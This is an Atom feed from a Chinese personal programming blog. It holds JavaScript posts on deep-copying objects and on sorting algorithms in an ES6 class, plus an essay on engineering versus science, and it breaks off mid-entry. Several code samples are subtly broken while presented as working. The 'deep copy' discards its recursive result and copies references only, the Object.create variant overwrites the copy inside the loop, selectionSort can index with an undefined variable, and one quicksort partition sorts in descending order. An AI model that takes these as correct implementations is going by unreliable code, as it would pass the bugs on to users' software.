<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>wanglinzhizhi</title>
  <subtitle>Hi, wanglinzhizhi</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.wanglinzhizhi.me/"/>
  <updated>2017-02-19T09:33:28.000Z</updated>
  <id>http://www.wanglinzhizhi.me/</id>
  
  <author>
    <name>wanglinzhizhi</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>小算法|关于对象的深复制</title>
    <link href="http://www.wanglinzhizhi.me/2017/02/19/%E5%B0%8F%E7%AE%97%E6%B3%95-%E5%85%B3%E4%BA%8E%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%B7%B1%E5%A4%8D%E5%88%B6/"/>
    <id>http://www.wanglinzhizhi.me/2017/02/19/小算法-关于对象的深复制/</id>
    <published>2017-02-19T09:33:28.000Z</published>
    <updated>2017-02-19T09:33:28.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="小算法-关于对象深复制"><a href="#小算法-关于对象深复制" class="headerlink" title="小算法 | 关于对象深复制"></a>小算法 | 关于对象深复制</h2><ul>
<li>way1</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">copyObj</span>(<span class="params">obj</span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> copyObj=&#123;&#125;;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">of</span> <span class="built_in">Object</span>.keys(obj)) &#123;</div><div class="line">            <span class="comment">//引用类型</span></div><div class="line">            <span class="keyword">if</span> (obj[key] <span class="keyword">instanceof</span> <span class="built_in">Object</span>) &#123;</div><div class="line">              </div><div class="line"></div><div class="line">                <span class="comment">/**递归调用</span></div><div class="line">                 * </div><div class="line">                 * copyObj(obj[key])</div><div class="line">                 * </div><div class="line">                 * 再或者</div><div class="line">                 * arguments.callee(obj[key]);</div><div class="line">                 * </div><div class="line">                 **/</div><div class="line">                <span class="built_in">arguments</span>.callee(obj[key]);</div><div class="line"></div><div class="line">            &#125;</div><div class="line">            copyObj[key]=obj[key];</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">return</span> copyObj;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">var</span> wanglinzhizhiskillstack = &#123;</div><div class="line">        <span class="attr">name</span>: <span class="string">"wanglinzhizhi"</span>,</div><div class="line">        <span class="attr">sayHello</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">            <span class="built_in">console</span>.log(<span class="string">"hi , I'm "</span> + <span class="keyword">this</span>.name)</div><div class="line">        &#125;,</div><div class="line">        <span class="attr">fullstack</span>: &#123;</div><div class="line">            <span class="attr">ES6</span>: &#123;</div><div class="line">                <span class="attr">JavaScrip</span>: <span class="string">"80%"</span>,</div><div class="line">                <span class="attr">ES6</span>: <span class="string">"80%"</span></div><div class="line">            &#125;,</div><div class="line">            <span class="attr">HTML</span>: &#123;</div><div class="line">                <span class="attr">HTML5</span>: <span class="string">'90%'</span>,</div><div class="line">                <span class="attr">HTML</span>: <span class="string">'80%'</span></div><div class="line">            &#125;,</div><div class="line">            <span class="attr">CSS</span>: &#123;</div><div class="line">                <span class="attr">CSS3</span>: <span class="string">'90%'</span>,</div><div class="line">                <span class="attr">CSS</span>: <span class="string">'80%'</span></div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">var</span> wanglinzhizhiCopy = copyObj(wanglinzhizhiskillstack)</div><div class="line">&#125;)()</div></pre></td></tr></table></figure>
<p><strong>Notes</strong> : 有个需要留一点 地方是 ,对象的属性可能 也是引用类型的,需要判断下,若是引用类型,则需要递归调用 copyObj 方法.</p>
<p><br><br><br><br><br></p>
<h3 id="way2-gt-Object-create"><a href="#way2-gt-Object-create" class="headerlink" title="way2 -&gt; Object.create()"></a>way2 -&gt; Object.create()</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">copyObj</span>(<span class="params">obj</span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> copyObj=&#123;&#125;;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">of</span> <span class="built_in">Object</span>.keys(obj)) &#123;</div><div class="line">            <span class="comment">//引用类型</span></div><div class="line">            <span class="keyword">if</span> (obj[key] <span class="keyword">instanceof</span> <span class="built_in">Object</span>) &#123;</div><div class="line">              </div><div class="line"></div><div class="line">                <span class="comment">/**递归调用</span></div><div class="line">                 * </div><div class="line">                 * copyObj(obj[key])</div><div class="line">                 * </div><div class="line">                 * 再或者</div><div class="line">                 * arguments.callee(obj[key]);</div><div class="line">                 * </div><div class="line">                 **/</div><div class="line">                <span class="built_in">arguments</span>.callee(obj[key]);</div><div class="line"></div><div class="line">            &#125;</div><div class="line">            <span class="comment">// copyObj[key]=obj[key];</span></div><div class="line">            copyObj=<span class="built_in">Object</span>.create(obj)</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">return</span> copyObj;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">var</span> wanglinzhizhiskillstack = &#123;</div><div class="line">        <span class="attr">name</span>: <span class="string">"wanglinzhizhi"</span>,</div><div class="line">        <span class="attr">sayHello</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">            <span class="built_in">console</span>.log(<span class="string">"hi , I'm "</span> + <span class="keyword">this</span>.name)</div><div class="line">        &#125;,</div><div class="line">        <span class="attr">fullstack</span>: &#123;</div><div class="line">            <span class="attr">ES6</span>: &#123;</div><div class="line">                <span class="attr">JavaScrip</span>: <span class="string">"80%"</span>,</div><div class="line">                <span class="attr">ES6</span>: <span class="string">"80%"</span></div><div class="line">            &#125;,</div><div class="line">            <span class="attr">HTML</span>: &#123;</div><div class="line">                <span class="attr">HTML5</span>: <span class="string">'90%'</span>,</div><div class="line">                <span class="attr">HTML</span>: <span class="string">'80%'</span></div><div class="line">            &#125;,</div><div class="line">            <span class="attr">CSS</span>: &#123;</div><div class="line">                <span class="attr">CSS3</span>: <span class="string">'90%'</span>,</div><div class="line">                <span class="attr">CSS</span>: <span class="string">'80%'</span></div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">var</span> wanglinzhizhiCopy = copyObj(wanglinzhizhiskillstack)</div><div class="line">&#125;)()</div></pre></td></tr></table></figure>
<p><br><br><br><br><br></p>
<p>by wanglinzhizhi</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;小算法-关于对象深复制&quot;&gt;&lt;a href=&quot;#小算法-关于对象深复制&quot; class=&quot;headerlink&quot; title=&quot;小算法 | 关于对象深复制&quot;&gt;&lt;/a&gt;小算法 | 关于对象深复制&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;way1&lt;/li&gt;
&lt;/ul&gt;
&lt;figure 
    
    </summary>
    
      <category term="算法" scheme="http://www.wanglinzhizhi.me/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="编程" scheme="http://www.wanglinzhizhi.me/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="算法" scheme="http://www.wanglinzhizhi.me/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="JavaScrip" scheme="http://www.wanglinzhizhi.me/tags/JavaScrip/"/>
    
  </entry>
  
  <entry>
    <title>算法: 排序 ES6 Class 实现</title>
    <link href="http://www.wanglinzhizhi.me/2017/02/19/%E7%AE%97%E6%B3%95-%E6%8E%92%E5%BA%8F-class-%E5%AE%9E%E7%8E%B0/"/>
    <id>http://www.wanglinzhizhi.me/2017/02/19/算法-排序-class-实现/</id>
    <published>2017-02-19T03:50:48.000Z</published>
    <updated>2017-02-19T03:50:48.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="经典算法-排序-ES6-Class-实现"><a href="#经典算法-排序-ES6-Class-实现" class="headerlink" title="经典算法 | 排序 ES6 Class 实现"></a>经典算法 | 排序 ES6 Class 实现</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">SortCollector</span> </span>&#123;</div><div class="line"></div><div class="line">  <span class="keyword">constructor</span>() &#123;</div><div class="line">    <span class="keyword">this</span>.arr = [];</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</div><div class="line">      <span class="keyword">let</span> max = <span class="number">10000</span>,</div><div class="line">        min = <span class="number">1</span>;</div><div class="line">      <span class="keyword">this</span>.arr.push(<span class="built_in">parseInt</span>(<span class="built_in">Math</span>.random() * (max - min) + min));</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="comment">//冒泡排序</span></div><div class="line">  bubblesort() &#123;</div><div class="line">    <span class="keyword">let</span> arr = <span class="keyword">this</span>.arr;</div><div class="line">    <span class="keyword">let</span> len = arr.length;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</div><div class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; len - <span class="number">1</span> - i; j++) &#123;</div><div class="line">        <span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) &#123;</div><div class="line">          <span class="keyword">let</span> temp = arr[j + <span class="number">1</span>];</div><div class="line">          arr[j + <span class="number">1</span>] = arr[j];</div><div class="line">          arr[j] = temp;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'bubblesort &gt;&gt;&gt;    '</span>);</div><div class="line">    <span class="built_in">console</span>.log(arr)</div><div class="line">    <span class="keyword">return</span> arr;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="comment">//选择排序</span></div><div class="line">  selectionSort() &#123;</div><div class="line">    <span class="keyword">let</span> arr = <span class="keyword">this</span>.arr;</div><div class="line"></div><div class="line">    <span class="keyword">let</span> len = arr.length;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</div><div class="line">      <span class="keyword">let</span> min = arr[i];</div><div class="line">      <span class="keyword">let</span> temp_index;</div><div class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> j = i + <span class="number">1</span>; j &lt; len; j++) &#123;</div><div class="line">        <span class="keyword">if</span> (min &gt; arr[j]) &#123;</div><div class="line">          min = arr[j];</div><div class="line">          temp_index = j;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      <span class="comment">//swap(min,arr[i])</span></div><div class="line">      <span class="keyword">let</span> temp = arr[i];</div><div class="line">      arr[i] = min;</div><div class="line">      arr[temp_index] = temp;</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'selectionSort &gt;&gt;&gt;    '</span>);</div><div class="line">    <span class="built_in">console</span>.log(arr)</div><div class="line"></div><div class="line">    <span class="keyword">return</span> arr;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="comment">//插入排序</span></div><div class="line">  insertSort() &#123;</div><div class="line">    <span class="keyword">let</span> arr = <span class="keyword">this</span>.arr;</div><div class="line">    <span class="keyword">let</span> len = arr.length;</div><div class="line">    <span class="keyword">let</span> current, preIndex;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; len; i++) &#123;</div><div class="line">      preIndex = i - <span class="number">1</span>;</div><div class="line">      current = arr[i];</div><div class="line">      <span class="keyword">while</span> (preIndex &gt;= <span class="number">0</span> &amp;&amp; arr[preIndex] &gt; current) &#123;</div><div class="line">        arr[preIndex + <span class="number">1</span>] = arr[preIndex];</div><div class="line">        preIndex--;</div><div class="line">      &#125;</div><div class="line">      arr[preIndex + <span class="number">1</span>] = current;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'insertSort &gt;&gt;&gt;    '</span>)</div><div class="line">    <span class="built_in">console</span>.log(arr);</div><div class="line">    <span class="keyword">return</span> arr;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="comment">//希尔排序 -&gt; 插入排序的一种优化 </span></div><div class="line"></div><div class="line"></div><div class="line">  <span class="comment">// 归并排序</span></div><div class="line">  mergeSort(arr) &#123;</div><div class="line">    <span class="keyword">let</span> len = arr.length;</div><div class="line">    <span class="keyword">if</span> (len &lt; <span class="number">2</span>) &#123;</div><div class="line">      <span class="keyword">return</span> arr;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">let</span> middle = <span class="built_in">Math</span>.floor(len / <span class="number">2</span>),</div><div class="line">      left = arr.slice(<span class="number">0</span>, middle),</div><div class="line">      right = arr.slice(middle);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.merge(<span class="keyword">this</span>.mergeSort(left), <span class="keyword">this</span>.mergeSort(right));</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  merge(left, right) &#123;</div><div class="line">    <span class="keyword">let</span> result = [];</div><div class="line"></div><div class="line">    <span class="keyword">while</span> (left.length &amp;&amp; right.length) &#123;</div><div class="line">      <span class="keyword">if</span> (left[<span class="number">0</span>] &lt;= right[<span class="number">0</span>]) &#123;</div><div class="line">        result.push(left.shift())</div><div class="line">      &#125; <span class="keyword">else</span> &#123;</div><div class="line">        result.push(right.shift())</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">while</span> (left.length) &#123;</div><div class="line">      result.push(left.shift())</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">while</span> (right.length) &#123;</div><div class="line">      result.push(right.shift())</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'mergeSort &gt;&gt;&gt;&gt;    '</span>)</div><div class="line">    <span class="built_in">console</span>.log(result);</div><div class="line">    <span class="keyword">return</span> result;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="comment">//快速排序</span></div><div class="line">  quickSort(arr, left, right) &#123;</div><div class="line"></div><div class="line">    <span class="keyword">let</span> len = arr.length,</div><div class="line">      partitionIndex;</div><div class="line">    left = <span class="keyword">typeof</span> left != <span class="string">'number'</span> ? <span class="number">0</span> : left;</div><div class="line">    right = <span class="keyword">typeof</span> right != <span class="string">'number'</span> ? len - <span class="number">1</span> : right;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (left &lt; right) &#123;</div><div class="line">      partitionIndex = <span class="keyword">this</span>.partition(arr, left, right);</div><div class="line">      <span class="keyword">this</span>.quickSort(arr, left, partitionIndex - <span class="number">1</span>);</div><div class="line">      <span class="keyword">this</span>.quickSort(arr, partitionIndex + <span class="number">1</span>, right);</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'quickSort&gt;&gt;&gt; '</span>);</div><div class="line">    <span class="built_in">console</span>.log(arr);</div><div class="line">    <span class="keyword">return</span> arr;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  partition(arr, left, right) &#123;</div><div class="line">    <span class="keyword">var</span> pivot = left,</div><div class="line">      index = pivot + <span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = index; i &lt;= right; i++) &#123;</div><div class="line">      <span class="keyword">if</span> (arr[i] &gt; arr[pivot]) &#123;</div><div class="line">        <span class="keyword">this</span>.swap(arr, i, index);</div><div class="line">        index++;</div><div class="line">      &#125;</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">this</span>.swap(arr, pivot, index - <span class="number">1</span>)</div><div class="line">    <span class="keyword">return</span> index - <span class="number">1</span>;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  swap(arr, i, j) &#123;</div><div class="line">    <span class="keyword">var</span> temp = arr[i];</div><div class="line">    arr[i] = arr[j];</div><div class="line">    arr[j] = temp;</div><div class="line">  &#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">  <span class="comment">//快排2 对 swap 函数的优化</span></div><div class="line">  paritition2(arr, low, high) &#123;</div><div class="line">    <span class="keyword">let</span> pivot = arr[low];</div><div class="line">    <span class="keyword">while</span> (low &lt; high) &#123;</div><div class="line">      <span class="keyword">while</span> (low &lt; high &amp;&amp; arr[high] &gt; pivot) &#123;</div><div class="line">        --high;</div><div class="line">      &#125;</div><div class="line">      arr[low] = arr[high];</div><div class="line">      <span class="keyword">while</span> (low &lt; high &amp;&amp; arr[low] &lt;= pivot) &#123;</div><div class="line">        ++low;</div><div class="line">      &#125;</div><div class="line">      arr[high] = arr[low];</div><div class="line">    &#125;</div><div class="line">    arr[low] = pivot;</div><div class="line">    <span class="keyword">return</span> low;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  quickSort2(arr, low, high) &#123;</div><div class="line">    <span class="keyword">if</span> (low &lt; high) &#123;</div><div class="line">      <span class="keyword">let</span> pivot = <span class="keyword">this</span>.paritition2(arr, low, high);</div><div class="line">      <span class="keyword">this</span>.quickSort2(arr, low, pivot - <span class="number">1</span>);</div><div class="line">      <span class="keyword">this</span>.quickSort2(arr, pivot + <span class="number">1</span>, high);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">//  console.log("quickSort2 &gt;&gt;&gt;&gt;&gt;&gt;")</span></div><div class="line">    <span class="comment">//  console.log(arr)</span></div><div class="line">    <span class="keyword">return</span> arr;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">let</span> sortDemo = <span class="keyword">new</span> SortCollector();</div><div class="line">sortDemo.bubblesort();</div><div class="line">sortDemo.selectionSort();</div><div class="line">sortDemo.insertSort();</div><div class="line">sortDemo.mergeSort(sortDemo.arr);</div><div class="line">sortDemo.quickSort(sortDemo.arr, <span class="number">0</span>, sortDemo.arr.length - <span class="number">1</span>)</div><div class="line">sortDemo.quickSort2(sortDemo.arr, <span class="number">0</span>, sortDemo.arr.length - <span class="number">1</span>)</div></pre></td></tr></table></figure>
<p>晚安,银河系</p>
<p>by wanglinzhizhi</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;经典算法-排序-ES6-Class-实现&quot;&gt;&lt;a href=&quot;#经典算法-排序-ES6-Class-实现&quot; class=&quot;headerlink&quot; title=&quot;经典算法 | 排序 ES6 Class 实现&quot;&gt;&lt;/a&gt;经典算法 | 排序 ES6 Class 实现&lt;/
    
    </summary>
    
      <category term="算法" scheme="http://www.wanglinzhizhi.me/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="算法" scheme="http://www.wanglinzhizhi.me/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="ES6" scheme="http://www.wanglinzhizhi.me/tags/ES6/"/>
    
  </entry>
  
  <entry>
    <title>ES5中函数的块级作用域的深层原因</title>
    <link href="http://www.wanglinzhizhi.me/2017/02/19/ES5%E4%B8%AD%E5%87%BD%E6%95%B0%E7%9A%84%E5%9D%97%E7%BA%A7%E4%BD%9C%E7%94%A8%E5%9F%9F%E7%9A%84%E6%9C%AC%E8%B4%A8%E5%8E%9F%E5%9B%A0/"/>
    <id>http://www.wanglinzhizhi.me/2017/02/19/ES5中函数的块级作用域的本质原因/</id>
    <published>2017-02-19T03:34:28.000Z</published>
    <updated>2017-02-19T03:34:28.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ES5中函数的块级作用域的深层原因"><a href="#ES5中函数的块级作用域的深层原因" class="headerlink" title="ES5中函数的块级作用域的深层原因"></a>ES5中函数的块级作用域的深层原因</h2><blockquote>
<p>ES5中函数的块级作用域的深层原因 </p>
<p>函数参数args &gt; 值复制 机制</p>
</blockquote>
<p>by wanglinzhizhi</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;ES5中函数的块级作用域的深层原因&quot;&gt;&lt;a href=&quot;#ES5中函数的块级作用域的深层原因&quot; class=&quot;headerlink&quot; title=&quot;ES5中函数的块级作用域的深层原因&quot;&gt;&lt;/a&gt;ES5中函数的块级作用域的深层原因&lt;/h2&gt;&lt;blockquote&gt;

    
    </summary>
    
      <category term="JavaScript" scheme="http://www.wanglinzhizhi.me/categories/JavaScript/"/>
    
    
      <category term="JavaScript" scheme="http://www.wanglinzhizhi.me/tags/JavaScript/"/>
    
      <category term="ES5" scheme="http://www.wanglinzhizhi.me/tags/ES5/"/>
    
  </entry>
  
  <entry>
    <title>关于工程化的个人理解</title>
    <link href="http://www.wanglinzhizhi.me/2017/02/18/%E5%85%B3%E4%BA%8E%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%90%86%E8%A7%A3/"/>
    <id>http://www.wanglinzhizhi.me/2017/02/18/关于工程化的个人理解/</id>
    <published>2017-02-18T03:46:15.000Z</published>
    <updated>2017-02-18T07:23:52.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="关于工程化的个人理解"><a href="#关于工程化的个人理解" class="headerlink" title="关于工程化的个人理解"></a>关于工程化的个人理解</h2><ul>
<li>工程与科学 <ul>
<li>工程和科学面对的问题</li>
<li>工程师和科学家在思路上的差异</li>
<li>工程师和科学家所需要解决的问题方式上的差异</li>
</ul>
</li>
<li>工程化的问题的由来. -&gt; 软件危机的前端表现 </li>
<li>工程化要解决的问题. -&gt; <ul>
<li>从面向过程编程-到面向对象编程的软件工程思想说起. </li>
<li>可维护问题(面向过程的编程是 OK 的,但强依赖于人. 如果人(大牛)离开,怎么让出了问题的时候问题可维护.)</li>
<li>前端工程化 问题的由来,涉及的方面(好吧,其实是方方面面)</li>
</ul>
</li>
</ul>
<h2 id="工程与科学"><a href="#工程与科学" class="headerlink" title="工程与科学"></a>工程与科学</h2><p>工程化是一个很泛化的命题,我们先从工程说起吧. 单方面说工程也是一个很难下口的问题.我们把工程与科学对比一下就清楚了.我们从工程师和科学家的视角对比一下各自的思考方式,问题就明确了.</p>
<p>很早以前在知乎看到过一个问题,对于工程和科学里面有很多精彩的回答:</p>
<p><a href="https://www.zhihu.com/question/20402148" target="_blank" rel="external">https://www.zhihu.com/question/20402148</a></p>
<p>摘抄几个精彩的回答</p>
<blockquote>
<p>Scientists study what it is, while Engineers create what never was.</p>
</blockquote>
<p><br></p>
<blockquote>
<p>工程师跟科学家更重要的区别可能是更懂得<strong>妥协。</strong></p>
<p>这里的妥协并非是贬义词，而是一种真实的状态。科学需要有一往无前、尽善尽美的精神，需要执着甚至于偏执才可以成功。而工程中需要考虑各个方面的因素，不论是成本，还是最后需要达到要求的各项参数，最后的结果也许每个参数都不优秀，但是方方面面都可以满足，就是好的结果。这不是得过且过，而是纵观全局之后的取舍。</p>
<p>.作者：陈章鱼</p>
<p>链接：<a href="https://www.zhihu.com/question/20402148/answer/15028338" target="_blank" rel="external">https://www.zhihu.com/question/20402148/answer/15028338</a></p>
<p>来源：知乎著作权归作者所有，转载请联系作者获得授权。</p>
</blockquote>
<p><br></p>
<blockquote>
<p>工程师说，世界应该是被改造的<br>科学家说，世界应该是被认识的</p>
<p>工程师说，世界应该是和谐的<br>科学家说，世界应该是多彩的</p>
<p>工程师说，世界应该是幸福的<br>科学家说，世界应该是真实的 </p>
<p>工程师说，世界应该是人类的<br>科学家说，人类应该是世界的  </p>
<p>工程师说，我想成为这个世界的上帝<br>科学家说，我想了解这个世界的上帝 </p>
<p>工程师说，我只相信统计<br>科学家说，我还相信奇迹</p>
<p>作者：苏芸</p>
<p>链接：<a href="https://www.zhihu.com/question/20402148/answer/15042350" target="_blank" rel="external">https://www.zhihu.com/question/20402148/answer/15042350</a></p>
<p>来源：知乎著作权归作者所有，转载请联系作者获得授权。</p>
</blockquote>
<p><br></p>
<blockquote>
<p>工程师的思维方式更接近于what—&gt;how，科学家的思维方式更接近于what—&gt;why</p>
</blockquote>
<p><br></p>
<blockquote>
<p>科学家是一种观察，发现的角度；<br>工程师是一种构建，创造的角度。</p>
</blockquote>
<p><br></p>
<blockquote>
<p>工程师解决的是具体问题，科学家研究的是抽象问题。<br>工程师往往是问题驱动型的，先由问题再想办法解决，科学家往往是主动构造问题，也就是所谓大胆假设，小心求证。但也不完全，工程师，比如软件工程师在解BUG的时候也会先假设再求证<br>现代社会分工明确，两者的工作内容不同层次不同，导致思维习惯不同。以前的年代，比如瓦特，特斯拉，他们是科学家还是工程师？</p>
<p>作者：Kelvin Li</p>
<p>链接：<a href="https://www.zhihu.com/question/20402148/answer/16779545" target="_blank" rel="external">https://www.zhihu.com/question/20402148/answer/16779545</a></p>
<p>来源：知乎著作权归作者所有，转载请联系作者获得授权。</p>
</blockquote>
<p><br></p>
<blockquote>
<p>科学家: 他们遇到的<strong>问题是开放的</strong>，他们做事情的<strong>目标通常也是模糊不量化</strong>的. <strong>工作方式和思维方式也是发散</strong></p>
<p>工程师: 他们遇到的<strong>问题是封闭</strong>的，做事情的<strong>目标一般也是</strong>清晰量化的。 通常工程师的<strong>工作方式和思维方式是收敛</strong>的，他们会在上述大树里面砍掉各个分支，找到一个<strong>够用</strong>的叶子（<a href="https://www.zhihu.com/people/b53bbee118a6db4d51c98060abd833cd" target="_blank" rel="external">@陈章鱼</a>说的<strong>妥协</strong>）</p>
</blockquote>
<p><br></p>
<p>回到我们的工程本身,工程中的问题是<strong>具体的</strong> , <strong>明确的</strong>. 工程师需要解决的问题也是实在的. 工程师的出发点是how. 怎么解决问题. 在技术没有质变之前,问题在这儿摆着的情况下,如何解决问题. 这里面或许还会有很多折中,妥协的地方. 但目标是明确的完成了解决问题 的目的. 另外就是<strong>成本问题</strong>, 时间成本,人力成本.这些是有限的.举两个具体的例子吧</p>
<p><br><br><br></p>
<blockquote>
<p>第一个例子 工程化和科学家是思考模式有点像 机器学习和数据挖掘  .<br>机器学习:是通过大样本训练,然后对一个特定目标进行匹配判断. 也就是说, 机器学习的目标和结果指向是明确的. 我通过对一百万个苹果样本进行分析处理(自学习),当下一个图片需要我来识别的时候我能够给出一个是或否的答案.</p>
<p>数据挖掘: 我通过对大量的数据进行分析统计,建模, 但是我不确定我能分析出什么内容.我的不确定我能收获什么样的结果.</p>
<p>第二个例子, CMD ,AMD, CommonJS 规范 和 ES6的 export moudle</p>
<p>CMD/AMD/CommonJS 诞生和存在的原因是在当时 ES5环境下,我们缺少(浏览器端和服务器端都是如此)对应于模块机制,但是我们又实在很需要模块机制. 所以我们在现有的条件下 (ES5 ), 实现了CMD /AMD/CommonJS 这种机制,这是一种妥协,因为我们只有这样的当前环境. 这个机制为我们解决了那个时候的问题. 我们可以更好的管理我们的代码了,我们的模块可以书写的更加清晰也更加好扩展和维护了.个人感觉 AMD/CMD/CommonJS 是工程化的一个经典实例. (按照相同思路的babel 也算).但是这就 OK 了吗? 额,没有.我们知道,我们 require 的时候,有可能会导致 <strong>循环加载</strong> 的问题.  这是很难避免的，尤其是依赖关系复杂的大项目，很容易出现<code>a</code>依赖<code>b</code>，<code>b</code>依赖<code>c</code>，<code>c</code>又依赖<code>a</code>这样的情况。这意味着，模块加载机制必须考虑“循环加载”的情况。</p>
<p>再看 ES6 .为什么我觉得 ES6 的 export / import 的 moudle 机制算是科学呢?</p>
<p>我们知道我们在 通过 require 关键字引入新的模块是整体作为一个实例对象被引入到当前环境的,加载完成开始执行. 而如果引入的对象恰巧与别的模块之间形成了<strong>加载回路</strong> , 这就会造成循环加载的问题. 问题出在了引入机制上.(这里问题有额外的方式来克服,此处不议.) <strong>CommonJS输入的是被输出值的拷贝，不是引用.</strong> </p>
<p>而 ES6模块是<strong>动态引用</strong>，使用 import从一个模块中加载变量,那些变量并不会被缓存,而是成为一个被加载对象的引用. 这种逻辑设计很好的避免了循环引用的问题.且<strong>export 的粒度</strong> 更加细化. 这是一个对 ES5 AMD /CMD/CommonJS 质变的地方.</p>
</blockquote>
<p>这个例子中工程师的解决方案,和科学家的解决方案的差异. 同样有问题导向,工程师 how &amp; make a solution,  科学家 create a new way</p>
<p><br><br><br><br><br><br><br></p>
<p>工程的主要目的是解决问题.浪漫一点的表述是让世界变得更美好. 而这个过程是中需要考虑诸多方面,我想到一点说一点</p>
<ul>
<li>现实因素的限制 | 在没有质变条件下面对问题的一种折中</li>
<li>成本(包括人力成本,时间成本) -&gt; 从这个方面思考,我们需要考虑<strong>效率问题</strong>, 以及<strong>自动化</strong> </li>
<li>工程,当引入新的机制或约束时, 对于产生的新的问题的解决.</li>
<li>实用. 需要考虑问题解决,并且稳定实用.</li>
</ul>
<p><br><br><br><br><br><br><br></p>
<p><strong>loading….</strong></p>
<p><br><br><br><br><br><br><br></p>
<blockquote>
<p>很久很久以前,小时候,老师问你将来想成为什么, 小孩儿们在底下大声说科学家. 这辈子这个目标渐渐地渐行渐远,努力成为一个工程师吧,起码要具备工程师的思维.</p>
</blockquote>
<p>By wanglinzhizhi</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;关于工程化的个人理解&quot;&gt;&lt;a href=&quot;#关于工程化的个人理解&quot; class=&quot;headerlink&quot; title=&quot;关于工程化的个人理解&quot;&gt;&lt;/a&gt;关于工程化的个人理解&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;工程与科学 &lt;ul&gt;
